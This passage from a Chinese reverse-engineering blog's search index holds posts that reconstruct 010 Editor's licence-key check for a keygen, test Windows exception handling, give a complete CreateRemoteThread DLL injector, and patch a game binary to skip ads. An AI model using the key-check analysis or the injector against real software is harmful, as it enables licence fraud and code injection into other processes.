0AFD13CC, 28603BCF, 3371066B, 30CD14E4, 175D3A67, 6DD66A13, 2D3409F9, 581E7B82, 76526B99, 5C8D5188, 2C857971, 15F51FC0, 68CC0D11, 49F55E5C, 275E4364, 2D1E0DBC, 4CEE7CE3, 32555840, 112E2E08, 6978065A, 72921406, 314578E7, 175621B7, 40771DBF, 3FC238D6, 4A31128A, 2DAD036E, 41A069D6, 25400192, 00DD4667, 6AFC1F4F, 571040CE, 62FE66DF, 41DB4B3E, 3582231F, 55F6079A, 1CA70644, 1B1643D2, 3F7228C9, 5F141070, 3E1474AB, 444B256E, 537050D9, 0F42094B, 2FD820E6, 778B2E5E, 71176D02, 7FEA7A69, 5BB54628, 19BA6C71, 39763A99, 178D54CD, 01246E88, 3313537E, 2B8E2D17, 2A3D10BE, 59D10582, 37A163DB, 30D6489A, 6A215C46, 0E1C7A76, 1FC760E7, 79B80C65, 27F459B4, 799A7326, 50BA1782, 2A116D5C, 63866E1B, 3F920E3C, 55023490, 55B56089, 2C391FD1, 2F8035C2, 64FD2B7A, 4CE8759A, 518504F0, 799501A8, 3F5B2CAD, 38E60160, 637641D8, 33352A42, 51A22C19, 085C5851, 032917AB, 2B770AC7, 30AC77B3, 2BEC1907, 035202D0, 0FA933D3, 61255DF3, 22AD06BF, 58B86971, 5FCA0DE5, 700D6456, 56A973DB, 5AB759FD, 330E0BE2, 5B3C0DDD, 495D3C60, 53BD59A6, 4C5E6D91, 49D9318D, 103D5079, 61CE42E3, 7ED5121D, 14E160ED, 212D4EF2, 270133F0, 62435A96, 1FA75E8B, 6F092FBE, 4A000D49, 57AE1C70, 004E2477, 561E7E72, 468C0033, 5DCC2402, 78507AC6, 58AF24C7, 0DF62D34, 358A4708, 3CFB1E11, 2B71451C, 77A75295, 56890721, 0FEF75F3, 120F24F1, 01990AE7, 339C4452, 27A15B8E, 0BA7276D, 60DC1B7B, 4F4B7F82, 67DB7007, 4F4A57D9, 621252E8, 20532CFC, 6A390306, 18800423, 19F3778A, 462316F0, 56AE0937, 43C2675C, 65CA45FD, 0D604FF2, 0BFD22CB, 3AFE643B, 3BF67FA6, 44623579, 184031F8, 32174F97, 4C6A092A, 5FB50261, 01650174, 33634AF1, 712D18F4, 6E997169, 5DAB7AFE, 7C2B2EE8, 6EDB75B4, 5F836FB6, 3C2A6DD6, 292D05C2, 052244DB, 149A5F4F, 5D486540, 331D15EA, 4F456920, 483A699F, 3B450F05, 3B207C6C, 749D70FE, 417461F6, 62B031F1, 2750577B, 29131533, 588C3808, 1AEF3456, 0F3C00EC, 7DA74742, 4B797A6C, 5EBB3287, 786558B8, 00ED4FF2, 6269691E, 24A2255F, 62C11F7E, 2F8A7DCD, 643B17FE, 778318B8, 253B60FE, 34BB63A3, 5B03214F, 5F1571F4, 1A316E9F, 7ACF2704, 28896838, 18614677, 1BF569EB, 0BA85EC9, 6ACA6B46, 1E43422A, 514D5F0E, 413E018C, 307626E9, 01ED1DFA, 49F46F5A, 461B642B, 7D7007F2, 13652657, 6B160BC5, 65E04849, 1F526E1C, 5A0251B6, 2BD73F69, 2DBF7ACD, 51E63E80, 5CF2670F, 21CD0A03, 5CFF0261, 33AE061E, 3BB6345F, 5D814A75, 257B5DF4, 0A5C2C5B, 16A45527, 16F23945&gt; &#125;;&gt; &gt; while(nNameLen)&gt; &#123;&gt; pName[i]&gt; char cName = toupper(pName); //小写转大写&gt; &gt; //注册类型1&gt; if(key[3] != 0xFC)&gt; &#123;&gt; LOCAL_1 = (nArray[cName]+LOCAL_1);&gt; LOCAL_1 ^= nArray[(cName+0xD)];&gt; LOCAL_1 *= nArray[(cName+0x2F)];&gt; &gt; LOCAL_1 += nArray[LOCAL_2];&gt; LOCAL_1 += nArray[ebx];&gt; LOCAL_1 += nArray[LOCAL_3];&gt; &#125;&gt; //注册类型0,没有用到&gt; else if(key[3] == 0xFC)&gt; &#123;&gt; LOCAL_1 = (nArray[cName]+LOCAL_1);&gt; LOCAL_1 ^= nArray[(cName+0x3F)];&gt; LOCAL_1 *= nArray[(cName+0x17)];&gt; &gt; LOCAL_1 += nArray[LOCAL_2];&gt; LOCAL_1 += nArray[ebx];&gt; LOCAL_1 += nArray[LOCAL_4];&gt; &#125;&gt; LOCAL_3 += 0x13;&gt; nNameLen--;&gt; LOCAL_2 += 0x9;&gt; ebx += 0xD &gt; LOCAL_4 += 0x7;&gt; i++;&gt; &#125;&gt; return LOCAL_1;&gt; 函数返回结果如上图。 第五步 处理计算结果 由上图分析可知，接下来将处理用户名函数的返回值多次右移比较，根据结果分发返回值，最终跳转到我们需要的返回值0x2D。代码如下 1234567891011121314151617181920212223242526&gt;013BDDB6 . E8 955004FF CALL 010Edito.00402E50 ; 处理用户名的函数&gt;013BDDBB . 8BD0 MOV EDX,EAX&gt;013BDDBD . 83C4 10 ADD ESP,0x10 ; 意味着上面函数有四个参数&gt;013BDDC0 . 3855 E0 CMP BYTE PTR SS:[EBP-0x20],DL ; 比较key[4]，返回值低8位&gt;013BDDC3 . 0F85 81000000 JNZ 010Edito.013BDE4A ; 跳转到返回0xE7，失败&gt;013BDDC9 . 8BCA MOV ECX,EDX&gt;013BDDCB . C1E9 08 SHR ECX,0x8 ; 右移0x8&gt;013BDDCE . 3AF9 CMP BH,CL ; key[5],cl&gt;013BDDD0 . 75 78 JNZ SHORT 010Edito.013BDE4A ; 跳转到返回0xE7，失败&gt;013BDDD2 . 8BCA MOV ECX,EDX&gt;013BDDD4 . C1E9 10 SHR ECX,0x10 ; 右移10位&gt;013BDDD7 . 384D E2 CMP BYTE PTR SS:[EBP-0x1E],CL ; key[6]&gt;013BDDDA . 75 6E JNZ SHORT 010Edito.013BDE4A ; 跳转到返回0xE7，失败&gt;013BDDDC . C1E8 18 SHR EAX,0x18 ; 右移0x18&gt;013BDDDF . 3845 E3 CMP BYTE PTR SS:[EBP-0x1D],AL ; key[7]&gt;013BDDE2 . 75 66 JNZ SHORT 010Edito.013BDE4A ; 跳转到返回0xE7，失败&gt;013BDDE4 . 80FB 9C CMP BL,0x9C ; Switch (cases 9C..FC)&gt;013BDDE7 . 75 0F JNZ SHORT 010Edito.013BDDF8&gt;013BDDE9 . 8B45 08 MOV EAX,DWORD PTR SS:[EBP+0x8] ; Case 9C of switch 013BDDE4&gt;013BDDEC . 3B47 1C CMP EAX,DWORD PTR DS:[EDI+0x1C] ; 小于等于&gt;013BDDEF . 76 52 JBE SHORT 010Edito.013BDE43 ; 跳转到返回0x2D，验证正确&gt;013BDDF1 . BE 4E000000 MOV ESI,0x4E&gt;013BDDF6 . EB 57 JMP SHORT 010Edito.013BDE4F ; 返回返回4E，验证失败&gt;013BDDF8 &gt; 80FB FC CMP BL,0xFC&gt;013BDDFB . 75 2E JNZ SHORT 010Edito.013BDE2B ; FC分支得不到正确结果，跳过&gt; 1234567891011121314151617181920212223242526&gt;013BDE2B &gt; 80FB AC CMP BL,0xAC&gt;013BDE2E . 75 1A JNZ SHORT 010Edito.013BDE4A&gt;013BDE30 . 8B45 F0 MOV EAX,DWORD PTR SS:[EBP-0x10] ; Case AC of switch 013BDDE4&gt;013BDE33 . 85C0 TEST EAX,EAX&gt;013BDE35 . 74 13 JE SHORT 010Edito.013BDE4A ; 跳转到验证错误&gt;013BDE37 . 3945 0C CMP DWORD PTR SS:[EBP+0xC],EAX&gt;013BDE3A . 76 07 JBE SHORT 010Edito.013BDE43 ; 跳转到返回0x2D,验证正确&gt;013BDE3C . BE 4E000000 MOV ESI,0x4E&gt;013BDE41 . EB 0C JMP SHORT 010Edito.013BDE4F&gt;013BDE43 &gt; BE 2D000000 MOV ESI,0x2D ; 验证正确，返回0x2D!!!!&gt;013BDE48 . EB 05 JMP SHORT 010Edito.013BDE4F&gt;013BDE4A &gt; BE E7000000 MOV ESI,0xE7 ; Default case of switch 013BDDE4&gt;013BDE4F &gt; 8D4D EC LEA ECX,DWORD PTR SS:[EBP-0x14]&gt;013BDE52 . C745 FC FFFFF&gt;MOV DWORD PTR SS:[EBP-0x4],-0x1&gt;013BDE59 . FF15 7C24E702 CALL DWORD PTR DS:[&lt;&amp;Qt5Core.??1Q&gt;; Qt5Core.??1QByteArray@@QAE@XZ&gt;013BDE5F . 8BC6 MOV EAX,ESI&gt;013BDE61 . 8B4D F4 MOV ECX,DWORD PTR SS:[EBP-0xC]&gt;013BDE64 . 64:890D 00000&gt;MOV DWORD PTR FS:[0],ECX&gt;013BDE6B . 59 POP ECX ; 0584FD48&gt;013BDE6C . 5F POP EDI ; 0584FD48&gt;013BDE6D . 5E POP ESI ; 0584FD48&gt;013BDE6E . 5B POP EBX ; 0584FD48&gt;013BDE6F . 8BE5 MOV ESP,EBP&gt;013BDE71 . 5D POP EBP ; 0584FD48&gt;013BDE72 . C2 0800 RETN 0x8&gt; 上述代码中，将返回值低八位和key[ n ]进行比较，每次比较完后右移八位，再次比较新数值的低八位。总共比较4次，正好将32位返回值全部比对完。 在第三步分析0x9C分支中已经得到 [EDI+0x1C] = ecx = (key[0]^key[6]^0x18+0x3D)^0xA7， 局部变量 [ EBP+0x8 ] = 9。 局部变量[ EBP - 0x10] 为第三步中分析AC分支返回eax得到， 12&gt; eax = ((((key[1]^key[7]) * 0x100 + key[2]^key[5])^0x7892 + 0x4D30)^0x3421)/0xB;&gt; 局部变量 [ EBP+0xC ] = 4389。 转换为C代码为 1234567891011121314151617181920212223242526272829&gt;//将返回值看成为一个数组，nArray[4]&gt;if((nArray[0]==key[4]) &amp;&amp;&gt; (nArray[1]==key[5]) &amp;&amp;&gt; (nArray[2]==key[6]) &amp;&amp;&gt; (nArray[3]==key[7]))&gt; &#123;&gt; if(key[3]==0x9C)&gt; &#123;&gt; //[EDI+0x1C] = (key[0]^key[6]^0x18+0x3D)^0xA7;&gt; if(9 &lt;= (key[0]^key[6]^0x18+0x3D)^0xA7))&gt; &#123;&gt; return 0x2D; //验证成功&gt; &#125;&gt; return 0x4E; //验证失败&gt; &#125;&gt; else if(key[3]==0xFC)&gt; &#123;&gt; return 0xE7; //验证失败&gt; &#125;&gt; else if(key[3]=0xAC)&gt; &#123;&gt; if([ebp - 10] &gt;= 4389) &gt; &#123;&gt; return 0x2D; //验证成功&gt; &#125;&gt; return 0x4E; //验证失败&gt; &#125;&gt; &#125;&gt; 第六步 编写注册机","categories":[],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://yoursite.com/tags/逆向/"}]},{"title":"验证异常处理调用顺序","slug":"验证异常处理调用顺序","date":"2018-06-21T11:57:52.000Z","updated":"2018-06-22T00:55:13.272Z","comments":true,"path":"2018/06/21/验证异常处理调用顺序/","link":"","permalink":"http://yoursite.com/2018/06/21/验证异常处理调用顺序/","excerpt":"","text":"验证异常处理调用顺序：VEH –&gt; SEH –&gt; VCH 1234567891011121314151617181920212223242526272829303132333435363738394041#include \"stdafx.h\"#include &lt;windows.h&gt;LONG WINAPI vch(EXCEPTION_POINTERS* pExcept)&#123; printf(\"vch\\n\"); return EXCEPTION_CONTINUE_SERCH;&#125;LONG WINAPI veh(EXCEPTION_POINTERS* pExcept)&#123; printf(\"veh\\n\"); return EXCEPTION_CONTINUE_SEARCH;&#125;LONG WINAPI seh(EXCEPTION_POINTERS* pExcept)&#123; printf(\"seh\\n\"); return EXCEPTION_CONTINUE_SEARCH;&#125;LONG WINAPI ueh(EXCEPTION_POINTERS* pExcept)&#123; printf(\"ueh\\n\"); return EXCEPTION_CONTINUE_SEARCH;&#125;int _tmain(int argc, _TCHAR* argv[])&#123; AddVectoredContinueHandler(TRUE, vch); AddVectoreExceptionHandler(TRUE, veh); //在64位系统系下，当程序被调用时，UEH不会被调用，不被调试才会被调用 //在32位系统下，被调试时也会被调用 SetUnhandledExceptionFilter(ueh); __try&#123; *(int*)0=0; &#125; __except(seh(GetExceptionInformation()))&#123; &#125; return 0;&#125;","categories":[],"tags":[{"name":"调试与异常","slug":"调试与异常","permalink":"http://yoursite.com/tags/调试与异常/"}]},{"title":"分析KiTrap03, CommonDisPatchException, KiDispatchException, KiUserExceptionDispatcher","slug":"分析KiTrap03, CommonDisPatchException, KiDispatchException, KiUserExceptionDispatcher","date":"2018-06-21T11:57:52.000Z","updated":"2018-06-22T00:56:51.840Z","comments":true,"path":"2018/06/21/分析KiTrap03, CommonDisPatchException, KiDispatchException, KiUserExceptionDispatcher/","link":"","permalink":"http://yoursite.com/2018/06/21/分析KiTrap03, CommonDisPatchException, KiDispatchException, KiUserExceptionDispatcher/","excerpt":"","text":"KiTrap03： （1）处理int3异常的函数为KITrap03 （2）在开始异常处理之初，先构造TRAP_FRAME陷阱帧结构，陷阱帧是指一个结构体，用来保存系统调用、中断、异常发生时的寄存器现场，方便以后回到用户空间 / 回到中断处时，回复那些寄存器的值，继续执行 （3）注意到KiTrap03实际上调用了CommonDispatchException CommonDisPatchException： （1）判断是用户异常还是内核异常使用的是CS段寄存器的最后两位 （2）构件了一个异常记录的结构 （3）之后实际上调用了KiDispatchException来处理异常 KiDispatchException： （1）该函数用于分发异常，根据异常所产生的模式找到异常的函数 （2）如果异常发生在内核模式，函数会直接调用一个异常处理函数直接处理异常 （3）如果异常发生在用户模式，则函数会将异常记录、异常栈帧 和 陷阱栈帧拷贝到用户模式的线程的栈（这些信息在用户态可以被修改，被修改会重新设置到线程环境上），随后函数会进入到用户态，到了用户态之后会被专门的函数去处理异常。 KiUserExceptionDispatcher： （1）函数第一个参数为异常类型，第二个参数为产生异常时的上下文记录 （2）KiUserExceptionDispatcher 的核心是对 RtlDispatchException 的调用。这拉开了搜索已注册的异常处理程序的序幕。如果某个处理程序处理这个异常并继续执行，那么对 RtlDispatchException 的调用就不会返回。如果它返回了，只有两种可能：或者调用了NtContinue以便让进程继续执行，或者产生了新的异常。如果是这样，那异常就不能再继续处理了，必须终止进程。","categories":[],"tags":[{"name":"调试与异常","slug":"调试与异常","permalink":"http://yoursite.com/tags/调试与异常/"}]},{"title":"DLL注入+VEH 的方式处理异常 （一）","slug":"DLL注入 + VEH 的方式处理异常","date":"2018-06-21T11:57:52.000Z","updated":"2018-06-22T00:53:13.051Z","comments":true,"path":"2018/06/21/DLL注入 + VEH 的方式处理异常/","link":"","permalink":"http://yoursite.com/2018/06/21/DLL注入 + VEH 的方式处理异常/","excerpt":"","text":"test.cpp 12345678910111213#include \"stdafx.h\"#include &lt;process.h&gt;int main()&#123; printf(\"输入\\n\"); int a, b; scanf_s(\"%d\", &amp;a); b = 1 / a; printf(\"%d\\n\", b); system(\"pause\"); return 0;&#125; dllmain.dll 1234567891011121314151617181920212223242526272829303132333435363738// dllmain.cpp : 定义 DLL 应用程序的入口点。#include \"stdafx.h\"#include \"stdio.h\"#include \"windows.h\"LONG WINAPI veh(EXCEPTION_POINTERS* pExce)&#123; if (pExce-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) &#123; pExce-&gt;ContextRecord-&gt;Eip += 3; printf(\"fdsf\\n\"); return EXCEPTION_CONTINUE_EXECUTION; &#125; return EXCEPTION_CONTINUE_SEARCH;&#125; BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: //1. 将异常处理函数注册到系统 AddVectoredExceptionHandler(TRUE, veh); printf(\"注册异常处理函数成功！\\n\"); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 注入器 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101// 远程注入.cpp: 定义控制台应用程序的入口点。//#include \"stdafx.h\"#include \"windows.h\"bool injectDll(DWORD dwPid, const char* pszDllPath);int main()&#123; DWORD dwPid; char szDllPath[MAX_PATH] = &#123; \"C:\\\\Users\\\\Administrator\\\\source\\\\repos\\\\VEH_Dll\\\\Debug\\\\VEH_Dll.dll\"&#125;; printf(\"输入要注入到的进程PID：\"); scanf_s(\"%d[*]\", &amp;dwPid); injectDll(dwPid, szDllPath); return 0;&#125;bool injectDll(DWORD dwPid, const char* pszDllPath)&#123; bool bRet = false; HANDLE hProcess = 0; HANDLE hRemoteThread = 0; LPVOID pRemoteBuff = NULL; SIZE_T dwWrite = 0; DWORD dwSize = 0; //打开进程 hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,/*创建线程和写入内存权限*/ FALSE, dwPid/*进程ID*/); if (hProcess == NULL) &#123; printf(\"打开进程失败,可能由于本程序的权限太低,请以管理员身份运行再尝试\\n\"); goto _EXIT; &#125; //1. 在远程进程上开辟内存空间 pRemoteBuff = VirtualAllocEx( hProcess, NULL, 64*1024,/*大小：64Kb*/ MEM_COMMIT,/*预定并提交*/ PAGE_EXECUTE_READWRITE/*可读可写可执行的属性*/ ); if (pRemoteBuff == NULL) &#123; printf(\"在远程进程上开辟空降失败\\n\"); goto _EXIT; &#125; //2. 将DLL路径写入到新开的内存空间中 dwSize = strlen(pszDllPath) + 1; WriteProcessMemory( hProcess, pRemoteBuff,/* 要写入的地址 */ pszDllPath, /* 要写入的内容的地址*/ dwSize, /* 写入的字节数 */ &amp;dwWrite /* 输入：函数实际写入的字节数*/ ); if (dwWrite != dwSize) &#123; printf(\"写入Dll路径失败\\n\"); goto _EXIT; &#125; //3. 创建远程线程 // 远程线程创建成功后,DLL就会被加载,DLL被加载后DllMain函数 // 就会被执行,如果想要执行什么代码,就在DllMain中调用即可. hRemoteThread = CreateRemoteThread( hProcess, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, /* 线程回调函数 */ pRemoteBuff, /* 回调函数参数 */ 0, 0); // 等待远程线程退出. // 退出了才释放远程进程的内存空间. WaitForSingleObject(hRemoteThread, -1); bRet = true;_EXIT: // 释放远程进程的内存 VirtualFreeEx(hProcess, pRemoteBuff, 0, MEM_RELEASE); // 关闭进程句柄 CloseHandle(hProcess); return bRet;&#125;","categories":[],"tags":[{"name":"调试与异常","slug":"调试与异常","permalink":"http://yoursite.com/tags/调试与异常/"}]},{"title":"连连看分析","slug":"连连看分析","date":"2018-05-28T06:11:37.000Z","updated":"2018-07-30T01:25:57.904Z","comments":true,"path":"2018/05/28/连连看分析/","link":"","permalink":"http://yoursite.com/2018/05/28/连连看分析/","excerpt":"","text":"连连看分析一、去广告分析1. 分析程序，获取程序的基本信息使用PEID进行扫描，获取一下进程的信息（编译环境） 2. 运行程序，测试程序执行qqllk.exe后弹出登录界面，执行登录界面后还有一层广告，执行广告后才可以运行程序。 点击“开始游戏”，弹出一个窗口： 查看任务管理器发现第二个连连看进程qq： 点击“继续”，弹出游戏界面： 查看任务管理器发现游戏进程kyodai.exe 分析： （1）可以发现其实时进程执行流程：qqllk.exe -> qqllk.ocx -> kyodai.exe。 （2）发现真正的程序后，直接双击运行kyodai.exe，然后程序崩溃。猜测游戏文件被改动过。 （3）我们直接将控件qqlll.ocx后缀该为exe后双击发现能够运行，我们可以直接分析这个文件。 将qqlll.ocx拖入火绒剑监视其动作行为 火绒剑监测到qqllk.exe对kyodai.exe进行了写入操作，我们使用x64dbg打开kyodai.exe，比对如上4个改动地址，发现在0x0043817A处数据不一致，猜测原游戏文件该地址数据为0，被人改动后，再由广告程序修复。 所以我们将 0x0043817A处01改为00并保存exe。双击kyodai.exe，发现进入游戏，去广告完成。 二、辅助制作待续…","categories":[{"name":"逆向工程","slug":"逆向工程","permalink":"http://yoursite.com/categories/逆向工程/"}],"tags":[{"name":"连连看分析","slug":"连连看分析","permalink":"http://yoursite.com/tags/连连看分析/"}]}]}